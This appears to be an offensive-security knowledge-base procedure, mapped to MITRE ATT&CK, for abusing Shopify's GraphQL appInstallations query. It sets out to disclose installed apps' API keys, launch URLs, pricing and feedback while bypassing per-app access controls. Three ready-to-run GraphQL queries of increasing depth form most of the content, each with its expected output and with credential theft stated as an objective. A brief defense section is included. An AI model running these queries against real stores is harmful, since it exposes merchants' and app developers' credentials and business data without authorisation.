---
tags:
  - information-disclosure
  - app-installations
  - graphql
  - shopify
type: procedure
tools:
  - '[[tools/GraphiQL]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
commands:
  - '[[commands/graphql-query-app-installations-basic]]'
  - '[[commands/graphql-query-app-installations-detailed]]'
  - '[[commands/graphql-query-app-installations-advanced]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Gather Victim Host Information]]'
  - '[[Data from Information Repositories]]'
updated_at: '2025-12-14T17:25:53.066Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: b360d03d-b83a-4505-bc21-0ca005e5b234
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Gather Victim Host Information]]'
  - '[[Data from Information Repositories]]'
---
# Query-App-Installations-for-Sensitive-App-Details

## Summary

This procedure queries appInstallations in Shopify's GraphQL API to access details like API keys, pricing, features, and feedback for apps without direct user access, bypassing per-app permissions.

## Description

The appInstallations query grants broad access via the 'Apps' scope, revealing launch URLs, API keys, pricing details, and error feedback even for Exchange Marketplace apps. This enables reconnaissance of installed ecosystem and potential key abuse. Multiple query variants test depth of disclosure.

## Requirements

1. 'Apps' permission in active GraphiQL session
2. Store with multiple app installations
3. GraphQL introspection for field validation

## Defense

Defensive measures and detection strategies:

- Implement fine-grained permissions for app queries based on installation ownership
- Log appInstallation queries and alert on broad fetches (first:100)
- Restrict nested fields like apiKey to authorized scopes only

## Objectives

1. Disclose app ecosystem details including credentials
2. Bypass individual app access controls via GraphQL
3. Gather pricing and feedback for competitive intel

## Instructions

### Step 1: Basic App Installations Query

**Context**: Start with core fields to confirm access.

**Command** ([[commands/graphql-query-app-installations-basic]]):

```graphql
{
  appInstallations(first: 100) {
    edges {
      node {
        id
        launchUrl
        app {
          apiKey
          features
        }
      }
    }
  }
}
```

> Expected output: Installations with API keys and features listed.

### Step 2: Detailed Query with Publications

**Context**: Expand to include publication and feedback.

**Command** ([[commands/graphql-query-app-installations-detailed]]):

```graphql
{
  appInstallations(first: 100) {
    edges {
      node {
        id
        publication {
          name
        }
        launchUrl
        app {
          apiKey
          features
          pricingDetails
          published
          feedback {
            messages {
              message
            }
          }
        }
      }
    }
  }
}
```

> Expected output: Enhanced details, some fields may be null but keys persist.

### Step 3: Advanced Query with Failed Requirements

**Context**: Probe deeper for pricing summaries and errors.

**Command** ([[commands/graphql-query-app-installations-advanced]]):

```graphql
{
  appInstallations(first: 100) {
    edges {
      node {
        id
        launchUrl
        app {
          pricingDetailsSummary
          apiKey
          features
          pricingDetails
          failedRequirements {
            action {
              url
              title
            }
          }
          published
          feedback {
            messages {
              message
            }
            link {
              url
            }
          }
        }
      }
    }
  }
}
```

> Expected output: Full app profile including failed actions and links, no access errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery
- [[Collection]] Collection

### Techniques

- [[Gather Victim Host Information]] Gather Victim Host Information
- [[Data from Information Repositories]] Data from Information Repositories

### Sub-Techniques

- None

## Commands Used

- [[commands/graphql-query-app-installations-basic]]
- [[commands/graphql-query-app-installations-detailed]]
- [[commands/graphql-query-app-installations-advanced]]

## Tools Used

- [[tools/GraphiQL]]

## Tags

- [[information-disclosure]]
- [[app-installations]]
- [[api-exposure]]
